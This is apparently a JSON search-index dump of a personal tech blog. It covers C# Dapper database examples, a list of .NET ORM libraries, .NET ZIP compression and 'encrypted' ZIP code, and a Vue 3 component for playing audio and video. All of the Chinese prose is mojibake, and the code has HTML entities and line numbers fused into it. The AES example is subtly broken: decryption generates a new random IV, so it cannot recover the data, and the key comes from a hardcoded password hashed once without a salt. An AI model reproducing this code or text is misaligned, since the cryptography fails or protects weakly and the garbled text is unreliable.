&#123; Console.WriteLine($&quot;Id: &#123;result.Id&#125;, Name: &#123;result.Name&#125;&quot;); &#125; &#125; &#125;&#125; ä»£ç è§£é‡Šä½¿ç”¨ DynamicParameters ç±»æ¥è®¾ç½®å­˜å‚¨è¿‡ç¨‹çš„è¾“å…¥å‚æ•°ã€‚commandType å‚æ•°æŒ‡å®šä¸º CommandType.StoredProcedureï¼Œè¡¨ç¤ºæ‰§è¡Œçš„æ˜¯å­˜å‚¨è¿‡ç¨‹ã€‚ æ‰¹é‡æ’å…¥å’Œæ›´æ–°å½“éœ€è¦ä¸€æ¬¡æ€§æ’å…¥æˆ–æ›´æ–°å¤šæ¡è®°å½•æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Dapper çš„æ‰¹é‡æ“ä½œæ¥æé«˜æ€§èƒ½ã€‚ç¤ºä¾‹ä»£ç  1234567891011121314151617181920212223242526272829303132using Dapper;using MySqlConnector;using System;using System.Collections.Generic;using System.Data;// è¦æ’å…¥çš„å¯¹è±¡ç±»public class Product&#123; public string Name &#123; get; set; &#125; public decimal Price &#123; get; set; &#125;&#125;class Program&#123; static void Main() &#123; string connectionString = &quot;your_connection_string&quot;; using (IDbConnection db = new MySqlConnection(connectionString)) &#123; var products = new List&lt;Product&gt; &#123; new Product &#123; Name = &quot;Product 1&quot;, Price = 10.99m &#125;, new Product &#123; Name = &quot;Product 2&quot;, Price = 20.99m &#125;, new Product &#123; Name = &quot;Product 3&quot;, Price = 30.99m &#125; &#125;; string insertSql = &quot;INSERT INTO Products (Name, Price) VALUES (@Name, @Price)&quot;; db.Execute(insertSql, products); &#125; &#125;&#125; Execute æ–¹æ³•å¯ä»¥æ¥å—ä¸€ä¸ªå¯¹è±¡é›†åˆä½œä¸ºå‚æ•°ï¼ŒDapper ä¼šè‡ªåŠ¨å°†é›†åˆä¸­çš„æ¯ä¸ªå¯¹è±¡æ˜ å°„åˆ° SQL è¯­å¥ä¸­çš„å‚æ•°ï¼Œå¹¶æ‰¹é‡æ‰§è¡Œæ’å…¥æ“ä½œã€‚ äº‹åŠ¡å¤„ç†åœ¨å¤„ç†å¤æ‚çš„æ•°æ®åº“æ“ä½œæ—¶ï¼Œå¯èƒ½éœ€è¦ç¡®ä¿å¤šä¸ªæ“ä½œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ï¼Œè¿™æ—¶å¯ä»¥ä½¿ç”¨äº‹åŠ¡ã€‚ 1234567891011121314151617181920212223242526272829303132333435using Dapper;using MySqlConnector;using System;using System.Data;class Program&#123; static void Main() &#123; string connectionString = &quot;your_connection_string&quot;; using (IDbConnection db = new MySqlConnection(connectionString)) &#123; db.Open(); using (IDbTransaction transaction = db.BeginTransaction()) &#123; try &#123; string sql1 = &quot;UPDATE Table1 SET Column1 = &#x27;NewValue&#x27; WHERE Id = 1&quot;; db.Execute(sql1, transaction: transaction); string sql2 = &quot;INSERT INTO Table2 (Column2) VALUES (&#x27;Value&#x27;)&quot;; db.Execute(sql2, transaction: transaction); transaction.Commit(); Console.WriteLine(&quot;Transaction committed successfully.&quot;); &#125; catch (Exception ex) &#123; transaction.Rollback(); Console.WriteLine($&quot;Transaction rolled back due to error: &#123;ex.Message&#125;&quot;); &#125; &#125; &#125; &#125;&#125; EF&#x2F;EF CoreEntity Framework (EF) Core æ˜¯è½»é‡åŒ–ã€å¯æ‰©å±•ã€å¼€æºå’Œè·¨å¹³å°ç‰ˆçš„å¸¸ç”¨ Entity Framework æ•°æ®è®¿é—®æŠ€æœ¯ï¼ŒEF Core æ˜¯é€‚ç”¨äº .NET çš„ç°ä»£å¯¹è±¡æ•°æ®åº“æ˜ å°„å™¨ã€‚å®ƒæ”¯æŒ LINQ æŸ¥è¯¢ã€æ›´æ”¹è·Ÿè¸ªã€æ›´æ–°å’Œæ¶æ„è¿ç§»ã€‚EF Core é€šè¿‡æä¾›ç¨‹åºæ’ä»¶ API ä¸ SQL Serverã€Azure SQL æ•°æ®åº“ã€SQLiteã€Azure Cosmos DBã€MySQLã€PostgreSQL å’Œå…¶ä»–æ•°æ®åº“ä¸€èµ·ä½¿ç”¨ï¼ˆå¾®è½¯å®˜æ–¹å‡ºå“ï¼‰ã€‚ å®˜æ–¹æ–‡æ¡£æ•™ç¨‹ï¼šhttps://docs.microsoft.com/zh-cn/ef/GitHubåœ°å€ï¼šhttps://github.com/dotnet/efcore DapperDapperæ˜¯ä¸€ä¸ªç®€å•çš„.NETå¯¹è±¡æ˜ å°„å™¨ï¼Œåœ¨é€Ÿåº¦æ–¹é¢å…·æœ‰â€King of Micro ORMâ€çš„å¤´è¡”ï¼Œå‡ ä¹ä¸ä½¿ç”¨åŸå§‹çš„ADO.NETæ•°æ®è¯»å–å™¨ä¸€æ ·å¿«ã€‚ORMæ˜¯ä¸€ä¸ªå¯¹è±¡å…³ç³»æ˜ å°„å™¨ï¼Œå®ƒè´Ÿè´£æ•°æ®åº“å’Œç¼–ç¨‹è¯­è¨€ä¹‹é—´çš„æ˜ å°„ã€‚Dapperé€šè¿‡æ‰©å±•IDbConnectionæä¾›ä¸€äº›æœ‰ç”¨çš„æ‰©å±•æ–¹æ³•å»æŸ¥è¯¢æ‚¨çš„æ•°æ®åº“ã€‚ å®˜æ–¹æ–‡æ¡£æ•™ç¨‹ï¼šhttps://www.learndapper.com/GitHubåœ°å€ï¼šhttps://github.com/DapperLib/Dapper SqlSugarSqlSugar æ˜¯ä¸€æ¬¾ è€ç‰Œ .NET å¼€æºå¤šåº“æ¶æ„ORMæ¡†æ¶ï¼ˆEF Coreå•åº“æ¶æ„ï¼‰ï¼Œç”±æœç³–å¤§æ•°æ®ç§‘æŠ€å›¢é˜Ÿ ç»´æŠ¤å’Œæ›´æ–° ï¼Œå¼€ç®±å³ç”¨æœ€æ˜“ä¸Šæ‰‹çš„.NET ORMæ¡†æ¶ ã€‚ å®˜ç½‘åœ°å€ï¼šhttp://www.donet5.comGitHubåœ°å€ï¼šhttps://github.com/donet5/SqlSugar FreeSqlFreeSql æ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆO&#x2F;RMï¼‰ç»„ä»¶ï¼Œæ”¯æŒ .NET Core 2.1+ã€.NET Framework 4.0+ ä»¥åŠ Xamarinã€‚ GitHubåœ°å€ï¼šhttps://github.com/dotnetcore/FreeSql Chloe.ORMChloe.ORM æ˜¯ä¸€æ¬¾å›½äº§ååˆ†ç¨³å®šå¯é çš„ ORM æ¡†æ¶ã€‚é™¤äº†å¸¸è§„å¢åˆ æŸ¥æ”¹å¤–è¿˜æ”¯æŒè¿æ¥æŸ¥è¯¢ã€åˆ†ç»„æŸ¥è¯¢ã€èšåˆæŸ¥è¯¢ã€å­æŸ¥è¯¢ï¼Œå¤§éƒ¨åˆ†æ“ä½œå¯é€šè¿‡ lambda å®Œæˆã€‚è¿˜æ”¯æŒåˆ†åº“åˆ†è¡¨åˆ†é¡µã€èšåˆã€åˆ†ç»„èšåˆï¼Œå¹¶æ”¯æŒå¤šä¸ªå­—æ®µç»„åˆåˆ†ç‰‡ä»¥åŠå¤šå­—æ®µè·¯ç”±ã€‚ æ–‡æ¡£åœ°å€ï¼šhttps :&#x2F;&#x2F;github.com&#x2F;shuxinqin&#x2F;Chloe&#x2F;wikiGitHubåœ°å€ï¼šhttps://github.com/shuxinqin/Chloe nhibernate-coreNHibernateæ˜¯.NETæ¡†æ¶çš„æˆç†Ÿã€å¼€æºçš„å¯¹è±¡å…³ç³»æ˜ å°„å·¥å…·ã€‚å®ƒåœ¨ç§¯æå¼€å‘ä¸­ï¼ŒåŠŸèƒ½é½å…¨ï¼Œå¹¶å·²æˆåŠŸåº”ç”¨äºæ•°åƒä¸ªé¡¹ç›®ä¸­ã€‚ NHibernateç¤¾åŒºç½‘ç«™: https://nhibernate.infoGitHubåœ°å€ï¼šhttps://github.com/nhibernate/nhibernate-core SmartSqlSmartSql &#x3D; C# ä¸­çš„ MyBatis + .NET Core+ ç¼“å­˜ï¼ˆå†…å­˜ | Redisï¼‰+ R&#x2F;W æ‹†åˆ† + PropertyChangedTrack +åŠ¨æ€å­˜å‚¨åº“ + InvokeSync + è¯Šæ–­ã€‚SmartSql å€Ÿé‰´äº† MyBatis çš„æ€æƒ³ï¼Œä½¿ç”¨ XML æ¥ç®¡ç† SQL ï¼Œå¹¶ä¸”æä¾›äº†è‹¥å¹²ä¸ªç­›é€‰å™¨æ ‡ç­¾æ¥æ¶ˆé™¤ä»£ç å±‚é¢çš„å„ç§ if&#x2F;else çš„åˆ¤æ–­åˆ†æ”¯ã€‚SmartSqlå°†ç®¡ç†ä½ çš„ SQL ï¼Œå¹¶ä¸”é€šè¿‡ç­›é€‰æ ‡ç­¾æ¥ç»´æŠ¤æœ¬æ¥ä½ åœ¨ä»£ç å±‚é¢çš„å„ç§æ¡ä»¶åˆ¤æ–­ï¼Œä½¿ä½ çš„ä»£ç æ›´åŠ ä¼˜ç¾ã€‚ æ–‡æ¡£åœ°å€ï¼š https://smartsql.net/guide/GitHubåœ°å€ï¼šhttps://github.com/dotnetcore/SmartSql PetaPocoPetaPoco æ˜¯ä¸€ä¸ªç”¨äº .NETï¼ˆ4ã€4.5+ã€net standard 2.0+ï¼‰å’Œ Mono çš„å¾®å‹ã€å¿«é€Ÿã€æ˜“äºä½¿ç”¨çš„ micro-ORMã€‚ç”±äº PetaPoco æ‰€ä»£è¡¨çš„ç®€å•æ€§å’Œæ˜“ç”¨æ€§ï¼Œå®ƒå—åˆ°è®¸å¤šäººçš„å–œçˆ±ã€‚PetaPoco æ˜¯é¦–é€‰çš„å¾® ORMï¼Œä¹Ÿæ˜¯ä»»ä½•ä½“é¢çš„å¼€å‘äººå‘˜å·¥å…·åŒ…ä¸­å¿…ä¸å¯å°‘çš„å®ç”¨ç¨‹åºã€‚ æ–‡æ¡£åœ°å€ï¼šhttps://discoverdot.net/projects/peta-pocoGitHubåœ°å€ï¼šhttps://github.com/CollaboratingPlatypus/PetaPoco linq2dbLINQ to DB æ˜¯æœ€å¿«çš„LINQæ•°æ®åº“è®¿é—®åº“ï¼Œåœ¨POCOå¯¹è±¡å’Œæ•°æ®åº“ä¹‹é—´æä¾›äº†ä¸€ä¸ªç®€å•ã€è½»é‡ã€å¿«é€Ÿä¸”ç±»å‹å®‰å…¨çš„å±‚ã€‚åœ¨æ¶æ„ä¸Šï¼Œå®ƒæ¯” Dapperã€Massive æˆ– PetaPoco ç­‰å¾® ORM é«˜å‡ºä¸€æ­¥ï¼Œå› ä¸ºæ‚¨ä½¿ç”¨ LINQ è¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯é­”æœ¯å­—ç¬¦ä¸²ï¼ŒåŒæ—¶åœ¨ä»£ç å’Œæ•°æ®åº“ä¹‹é—´ç»´æŠ¤ä¸€ä¸ªè–„æŠ½è±¡å±‚ã€‚æ‚¨çš„æŸ¥è¯¢ç”± C# ç¼–è¯‘å™¨æ£€æŸ¥å¹¶å…è®¸è½»æ¾é‡æ„ã€‚ä½†æ˜¯ï¼Œå®ƒä¸åƒ LINQ to SQL æˆ–å®ä½“æ¡†æ¶é‚£ä¹ˆé‡ã€‚æ²¡æœ‰æ›´æ”¹è·Ÿè¸ªï¼Œå› æ­¤æ‚¨å¿…é¡»è‡ªå·±è¿›è¡Œç®¡ç†ï¼Œä½†ä»ç§¯æçš„æ–¹é¢æ¥è¯´ï¼Œæ‚¨å¯ä»¥è·å¾—æ›´å¤šæ§åˆ¶æƒå¹¶æ›´å¿«åœ°è®¿é—®æ‚¨çš„æ•°æ®ã€‚ æ–‡æ¡£åœ°å€ï¼šhttps://linq2db.github.io/GitHubåœ°å€ï¼šhttps://github.com/linq2db/linq2db RepoDbRepoDBæ˜¯ä¸€ä¸ªå¼€æºçš„.NET ORMåº“ï¼Œå®ƒå¼¥åˆäº†å¾®ORMå’Œå®Œæ•´ORMä¹‹é—´çš„å·®è·ã€‚å®ƒå¸®åŠ©æ‚¨ç®€åŒ–åœ¨å¼€å‘è¿‡ç¨‹ä¸­ä½•æ—¶ä½¿ç”¨åŸºæœ¬æ“ä½œå’Œé«˜çº§æ“ä½œçš„åˆ‡æ¢ã€‚ GitHubåœ°å€ï¼šhttps://github.com/mikependon/RepoDB ServiceStack.OrmLiteOrmLiteæ˜¯ä¸€ä¸ªå¿«é€Ÿã€ç®€å•ã€ç±»å‹åŒ–çš„.NET ORMï¼ŒOrmLite çš„ç›®æ ‡æ˜¯æä¾›ä¸€ä¸ªæ–¹ä¾¿ã€DRYã€æ— é…ç½®ã€ä¸ RDBMS æ— å…³çš„ç±»å‹åŒ…è£…å™¨ï¼Œè¯¥åŒ…è£…å™¨ä¸ SQL ä¿æŒé«˜åº¦äº²å’Œæ€§ï¼Œå…¬å¼€ç›´è§‚çš„ APIï¼Œç”Ÿæˆå¯é¢„æµ‹çš„ SQL å¹¶å¹²å‡€åœ°æ˜ å°„åˆ°æ–­å¼€è¿æ¥å’Œæ•°æ®ä¼ è¾“å¯¹è±¡ (DTO) å‹å¥½ã€æ™®é€šçš„æ—§C# å¯¹è±¡ (POCO)ã€‚è¿™ç§æ–¹æ³•æ›´å®¹æ˜“æ¨ç†æ‚¨çš„æ•°æ®è®¿é—®ï¼Œä»è€Œæ¸…æ¥šåœ°çŸ¥é“ä»€ä¹ˆ SQL åœ¨ä»€ä¹ˆæ—¶é—´æ‰§è¡Œï¼ŒåŒæ—¶å‡è½»æ„å¤–è¡Œä¸ºã€éšå¼ N+1 æŸ¥è¯¢å’Œé‡å¯¹è±¡å…³ç³»æ˜ å°„å™¨ (ORM) ä¸­æ™®éå­˜åœ¨çš„æ³„æ¼æ•°æ®è®¿é—®ã€‚ æ–‡æ¡£åœ°å€ï¼šhttps://docs.servicestack.net/ormlite/GitHubåœ°å€ï¼šhttps://github.com/ServiceStack/ServiceStack.OrmLite SQLite-netç®€å•ã€å¼ºå¤§ã€è·¨å¹³å°çš„ SQLite å®¢æˆ·ç«¯å’Œ .NET çš„ ORMã€‚ GitHubåœ°å€ï¼šhttps://github.com/praeclarum/sqlite-net Insight.DatabaseInsight.Databaseæ˜¯ä¸€ä¸ªç”¨äº .NET çš„å¿«é€Ÿã€è½»é‡çº§çš„ micro-ormã€‚ GitHubåœ°å€ï¼šhttps://github.com/jonwagner/Insight.Database cyqdatacyq.dataæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ä¸”åŠŸèƒ½æœ€å¼ºå¤§çš„ormï¼ˆæ”¯æŒ.NET Coreï¼‰ï¼Œæ”¯æŒTxtã€Xmlã€Accessã€Sqliteã€Mssqlã€Mysqlã€Oracleã€Sybaseã€Postgresã€DB2ã€Redisã€MemCacheã€‚ GitHubåœ°å€ï¼šhttps://github.com/cyq1162/cyqdata querybuilderSQL æŸ¥è¯¢æ„å»ºå™¨ï¼Œç”¨ c# ç¼–å†™ï¼Œå¸®åŠ©æ‚¨è½»æ¾æ„å»ºå¤æ‚çš„æŸ¥è¯¢ï¼Œæ”¯æŒ SqlServerã€MySqlã€PostgreSqlã€Oracleã€Sqlite å’Œ Firebirdã€‚ å®˜ç½‘åœ°å€ï¼šhttps://sqlkata.com/GitHubåœ°å€ï¼šhttps://github.com/sqlkata/querybuilder TinyORMTinyORMæ˜¯ä¸€ä¸ªç®€å•ã€å¿«é€Ÿä¸”å®‰å…¨çš„å¾®å‹.NET ORMã€‚ Wikiåœ°å€ï¼šhttps://github.com/sdrapkin/SecurityDriven.TinyORM/wikiGitHubåœ°å€ï¼šhttps://github.com/sdrapkin/SecurityDriven.TinyORM","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"orm","slug":"orm","permalink":"https://banjinmei.github.io/tags/orm/"}],"author":"mu"},{"title":".NET ZIP","slug":"NET-ZIP","date":"2024-10-16T17:03:45.000Z","updated":"2024-10-16T17:06:35.265Z","comments":true,"path":"2024/10/17/NET-ZIP/","permalink":"https://banjinmei.github.io/2024/10/17/NET-ZIP/","excerpt":"","text":"å‹ç¼©ä¸€ä¸ªç›®å½•ä¸º ZIP æ–‡ä»¶12345678910111213141516using System;using System.IO.Compression;class Program&#123; static void Main() &#123; string startPath = @&quot;c:\\example\\start&quot;; // è¦å‹ç¼©çš„ç›®å½•è·¯å¾„ string zipPath = @&quot;c:\\example\\result.zip&quot;; // è¾“å‡ºçš„ ZIP æ–‡ä»¶è·¯å¾„ ZipFile.CreateFromDirectory(startPath, zipPath); Console.WriteLine(&quot;å‹ç¼©å®Œæˆï¼&quot;); &#125;&#125; å‹ç¼©å•ä¸ªæ–‡ä»¶åˆ° ZIP æ–‡ä»¶12345678910111213141516171819202122232425using System;using System.IO;using System.IO.Compression;class Program&#123; static void Main() &#123; string filePath = @&quot;c:\\example\\file.txt&quot;; // è¦å‹ç¼©çš„æ–‡ä»¶è·¯å¾„ string zipPath = @&quot;c:\\example\\result.zip&quot;; // è¾“å‡ºçš„ ZIP æ–‡ä»¶è·¯å¾„ using (FileStream fs = File.OpenRead(filePath)) using (FileStream zipFs = File.Create(zipPath)) using (ZipArchive archive = new ZipArchive(zipFs, ZipArchiveMode.Create)) &#123; var fileEntry = archive.CreateEntry(Path.GetFileName(filePath)); using (Stream entryStream = fileEntry.Open()) &#123; fs.CopyTo(entryStream); &#125; &#125; Console.WriteLine(&quot;å‹ç¼©å®Œæˆï¼&quot;); &#125;&#125; è§£å‹ ZIP æ–‡ä»¶12345678910111213141516using System;using System.IO.Compression;class Program&#123; static void Main() &#123; string zipPath = @&quot;c:\\example\\result.zip&quot;; // è¾“å…¥çš„ ZIP æ–‡ä»¶è·¯å¾„ string extractPath = @&quot;c:\\example\\extract&quot;; // è§£å‹çš„ç›®æ ‡ç›®å½• ZipFile.ExtractToDirectory(zipPath, extractPath); Console.WriteLine(&quot;è§£å‹å®Œæˆï¼&quot;); &#125;&#125; åŠ å¯†å‹ç¼©æ–‡ä»¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152using System;using System.IO;using System.IO.Compression;using System.Security.Cryptography;class Program&#123; static void Main() &#123; string sourceFile = @&quot;c:\\example\\file.txt&quot;; // è¦å‹ç¼©çš„æ–‡ä»¶è·¯å¾„ string zipPath = @&quot;c:\\example\\encrypted.zip&quot;; // è¾“å‡ºçš„ ZIP æ–‡ä»¶è·¯å¾„ string password = &quot;110110&quot;; // è®¾ç½®çš„å¯†ç  using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Create)) using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create, true)) &#123; ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(sourceFile)); using (Stream entryStream = entry.Open()) using (Aes aes = Aes.Create()) &#123; aes.Key = GetKey(password); // è·å– AES å¯†é’¥ aes.IV = GetIV(); // è·å– AES åˆå§‹åŒ–å‘é‡ using (CryptoStream cryptoStream = new CryptoStream(entryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) using (FileStream fileToCompress = new FileStream(sourceFile, FileMode.Open)) &#123; fileToCompress.CopyTo(cryptoStream); &#125; &#125; &#125; Console.WriteLine(&quot;åŠ å¯†å‹ç¼©å®Œæˆï¼&quot;); &#125; private static byte[] GetKey(string password) &#123; using (SHA256 sha256 = SHA256.Create()) &#123; return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password)); &#125; &#125; private static byte[] GetIV() &#123; byte[] iv = new byte[16]; // AES éœ€è¦ 16 å­—èŠ‚çš„ IV using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) &#123; rng.GetBytes(iv); &#125; return iv; &#125;&#125; è§£å¯†è§£å‹æ–‡ä»¶12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758using System;using System.IO;using System.IO.Compression;using System.Security.Cryptography;class Program&#123; static void Main() &#123; string zipPath = @&quot;c:\\example\\encrypted.zip&quot;; // è¾“å…¥çš„ ZIP æ–‡ä»¶è·¯å¾„ string extractPath = @&quot;c:\\example\\extract&quot;; // è§£å‹çš„ç›®æ ‡ç›®å½• string password = &quot;110110&quot;; // è®¾ç½®çš„å¯†ç  using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Open)) using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read)) &#123; foreach (ZipArchiveEntry entry in archive.Entries) &#123; string entryFilePath = Path.Combine(extractPath, entry.FullName); Directory.CreateDirectory(Path.GetDirectoryName(entryFilePath)); using (Stream entryStream = entry.Open()) using (Aes aes = Aes.Create()) &#123; aes.Key = GetKey(password); // è·å– AES å¯†é’¥ aes.IV = GetIV(); // è·å– AES åˆå§‹åŒ–å‘é‡ using (CryptoStream cryptoStream = new CryptoStream(entryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)) using (FileStream fileToExtract = new FileStream(entryFilePath, FileMode.Create)) &#123; cryptoStream.CopyTo(fileToExtract); &#125; &#125; &#125; &#125; Console.WriteLine(&quot;è§£å¯†è§£å‹å®Œæˆï¼&quot;); &#125; private static byte[] GetKey(string password) &#123; using (SHA256 sha256 = SHA256.Create()) &#123; return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password)); &#125; &#125; private static byte[] GetIV() &#123; byte[] iv = new byte[16]; // AES éœ€è¦ 16 å­—èŠ‚çš„ IV using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) &#123; rng.GetBytes(iv); &#125; return iv; &#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"vue3 dialog play aac mp4","slug":"vue3-dialog-play-aac-mp4","date":"2024-10-15T17:29:29.000Z","updated":"2024-10-15T17:32:59.592Z","comments":true,"path":"2024/10/16/vue3-dialog-play-aac-mp4/","permalink":"https://banjinmei.github.io/2024/10/16/vue3-dialog-play-aac-mp4/","excerpt":"","text":"vue3 play acc mp4 show png 1234567891011121314151617181920212223&lt;template&gt; &lt;div v-if=&quot;scope.row.MsgType == 7 || scope.row.MsgType == 19&quot;&gt; &lt;el-button :type=&quot;playingRowId === scope.row.AutoID ? &#x27;warning&#x27; : &#x27;info&#x27;&quot; :disabled=&quot;playingRowId === scope.row.AutoID&quot; @click=&quot;handleD(scope.row.Content, scope.row.MsgType, scope.row.UserID, scope.row.AutoID)&quot; &gt; &#123;&#123; playingRowId === scope.row.AutoID ? &#x27;æ’­æ”¾ä¸­&#x27; : &#x27;æ’­æ”¾&#x27; &#125;&#125; &lt;/el-button&gt; &lt;/div&gt; &lt;!-- MP4 Dialog --&gt; &lt;el-dialog :visible.sync=&quot;dialogVisible&quot; width=&quot;80%&quot; center @close=&quot;handleDialogClose&quot;&gt; &lt;video ref=&quot;videoPlayer&quot; controls autoplay @ended=&quot;handleDialogClose&quot; :src=&quot;mediaSource&quot; style=&quot;width: 100%;&quot; &gt;&lt;/video&gt; &lt;/el-dialog&gt;&lt;/template&gt; JSä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;;import &#123; ElMessage &#125; from &#x27;element-plus&#x27;;import request from &#x27;@/api/request&#x27;; // Assuming you use Axios or similarconst playingRowId = ref(null); // Tracks the AutoID of the row currently being playedconst dialogVisible = ref(false);const mediaSource = ref(&#x27;&#x27;);async function handleD(com, msgt, userid, autoid) &#123; try &#123; // Set the current row&#x27;s AutoID as the playing row playingRowId.value = autoid; const response = await request(&#123; url: &#x27;/adm/zuserApi/FdMsgJMCon&#x27;, method: &#x27;put&#x27;, data: &#123; com, msgtype: String(msgt), userid: String(userid) // Use UserID for API request &#125; &#125;); const &#123; isOk, msg &#125; = response; if (isOk) &#123; if (msg.endsWith(&#x27;.aac&#x27;)) &#123; playAAC(msg, autoid); &#125; else if (msg.endsWith(&#x27;.mp4&#x27;)) &#123; playMP4(msg); &#125; &#125; else &#123; ElMessage.error(&#x27;è·å–å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥æˆ–è”ç³»ç®¡ç†å‘˜&#x27;); &#125; &#125; catch (error) &#123; console.error(&#x27;è·å–æ—¶å‘ç”Ÿé”™è¯¯:&#x27;, error); ElMessage.error(&#x27;è·å–å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œè¿æ¥æˆ–è”ç³»ç®¡ç†å‘˜&#x27;); &#125;&#125;function playAAC(source, autoid) &#123; const audio = new Audio(source); audio.play(); audio.onended = () =&gt; &#123; // Reset the playing row when playback finishes if (playingRowId.value === autoid) &#123; playingRowId.value = null; &#125; &#125;; audio.onerror = () =&gt; &#123; if (playingRowId.value === autoid) &#123; playingRowId.value = null; &#125; ElMessage.error(&#x27;éŸ³é¢‘æ’­æ”¾å¤±è´¥&#x27;); &#125;;&#125;function playMP4(source) &#123; mediaSource.value = source; dialogVisible.value = true;&#125;function handleDialogClose() &#123; dialogVisible.value = false; playingRowId.value = null; // Reset when the dialog is closed&#125;&lt;/script&gt; è®¾ç½®åª’ä½“æºï¼ˆmediaSourceï¼‰ï¼šç¡®ä¿åœ¨æ‰“å¼€å¯¹è¯æ¡†ä¹‹å‰ï¼Œè§†é¢‘çš„æ¥æºï¼ˆmediaSource.valueï¼‰å·²æ­£ç¡®è®¾ç½®ä¸ºMP4çš„URLã€‚è®¾ç½®å¯¹è¯æ¡†å¯è§æ€§ï¼ˆdialogVisibleï¼‰ï¼šå¿…é¡»å°†dialogVisible.valueè®¾ç½®ä¸ºtrueï¼Œä»¥ç¡®ä¿å¯¹è¯æ¡†èƒ½å¤Ÿæ‰“å¼€ã€‚è§†é¢‘å…ƒç´ ï¼šè§†é¢‘å…ƒç´ çš„srcå±æ€§åº”ç»‘å®šåˆ°mediaSourceï¼Œå¹¶ä¸”è¯¥å…ƒç´ åº”åœ¨el-dialogç»„ä»¶ä¸­å¯è§ã€‚ å¼¹çª—æ³¨æ„å¼•å…¥ Element Plusv-model&#x3D;â€dialogVisibleâ€ console.log(â€˜Dialog visible:â€™, dialogVisible.value); &#x2F;&#x2F; trueconsole.log(â€˜Video source:â€™, mediaSource.value); &#x2F;&#x2F; MP4 URL å›¾ç‰‡æ˜¾ç¤ºä½¿ç”¨ Element Plus æä¾›çš„ el-image-viewer ç»„ä»¶ã€‚è¿™ä¸ªç»„ä»¶å…è®¸ä½ ç‚¹å‡»å›¾ç‰‡æ—¶æ˜¾ç¤ºå¤§å›¾ï¼Œå¸¦æœ‰æ”¾å¤§ã€ç¼©å°ã€æ—‹è½¬ç­‰åŠŸèƒ½ 12345678910111213&lt;!-- ç¼©ç•¥å›¾ --&gt; &lt;el-image style=&quot;width: 80px; height: 80px&quot; :src=&quot;scope.row.ContentT2&quot; @click=&quot;handleImageClick(scope.row.ContentT2)&quot; &gt; &lt;template #error&gt; ERR &lt;/template&gt; &lt;/el-image&gt; &lt;!-- å¤§å›¾æŸ¥çœ‹å™¨ --&gt; &lt;el-dialog :visible.sync=&quot;dialogVisible&quot; width=&quot;80%&quot; center @close=&quot;closeDialog&quot; append-to-body&gt; &lt;el-image-viewer :url-list=&quot;urlList&quot; :initial-index=&quot;0&quot; @close=&quot;closeDialog&quot; v-if=&quot;dialogVisible&quot; /&gt; &lt;/el-dialog&gt; JSä»£ç  1234567891011121314151617&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;;const dialogVisible = ref(false); // æ§åˆ¶å¯¹è¯æ¡†æ˜¯å¦å¯è§const urlList = ref([]); // å›¾ç‰‡åˆ—è¡¨// ç‚¹å‡»å›¾ç‰‡æ—¶è§¦å‘ï¼Œæ‰“å¼€å›¾ç‰‡æŸ¥çœ‹å™¨function handleImageClick(imageUrl) &#123; urlList.value = [imageUrl]; // è®¾ç½®å›¾ç‰‡ URL åˆ—è¡¨ dialogVisible.value = true; // æ‰“å¼€å¯¹è¯æ¡†&#125;// å…³é—­å¯¹è¯æ¡†function closeDialog() &#123; dialogVisible.value = false; // å…³é—­å¯¹è¯æ¡†&#125;&lt;/script&gt; ä¹Ÿå¯ä»¥ä½¿ç”¨ el-image ç®€å•å±•ç¤º&lt;!-- å¤§å›¾å±•ç¤º --&gt; &lt;el-dialog :visible.sync=&quot;dialogVisible&quot; width=&quot;50%&quot; center @close=&quot;closeDialog&quot; append-to-body&gt; &lt;el-image :src=&quot;currentImage&quot; style=&quot;width: 100%;&quot; /&gt; &lt;/el-dialog&gt; å–æ¶ˆæ’­æ”¾ç»“æŸå…³é—­ @ended&#x3D;â€handleDialogCloseâ€","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://banjinmei.github.io/tags/vue/"}],"author":"mu"},{"title":".net write wwwroot json","slug":"net-write-wwwroot-json","date":"2024-10-15T17:24:24.000Z","updated":"2024-10-15T17:27:41.002Z","comments":true,"path":"2024/10/16/net-write-wwwroot-json/","permalink":"https://banjinmei.github.io/2024/10/16/net-write-wwwroot-json/","excerpt":"","text":"1. åˆ›å»ºä¸€ä¸ªæ–°çš„æ§åˆ¶å™¨åœ¨Controllersæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªæ–°æ§åˆ¶å™¨ï¼Œä¾‹å¦‚JsonController.csã€‚ 